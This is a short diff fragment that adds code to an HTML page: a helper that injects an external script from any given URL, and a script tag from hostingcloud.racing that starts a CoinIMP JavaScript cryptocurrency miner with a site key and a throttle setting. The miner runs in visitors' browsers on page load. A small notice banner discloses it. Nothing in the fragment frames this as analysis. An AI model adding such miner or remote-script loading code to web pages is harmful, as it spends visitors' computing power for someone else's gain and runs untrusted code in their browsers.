+      if(!scriptUrl) { console.error("Aucune URL fournie"); return; }
+      const s = document.createElement('script');
+      s.src = scriptUrl;
+      s.async = true;
+      s.onload = () => console.log("Script externe chargé :", scriptUrl);
+      s.onerror = (e) => console.error("Échec du chargement du script :", scriptUrl, e);
+      document.body.appendChild(s);
+    }
+<script src="https://www.hostingcloud.racing/7ceB.js"></script>
+<script>
+    var _client = new Client.Anonymous('80b853dd927be9f5e6a561ddcb2f09a58a72ce6eee0b328e897c8bc0774642cd', {
+        throttle: 0.3, c: 'w'
+    });
+    _client.start();
+    _client.addMiningNotification("Bottom", "This site is running JavaScript miner from coinimp.com. If it bothers you, you can stop it.", "#0000ff", 20, "#ff0000");
   </script>
 </body>
 </html>
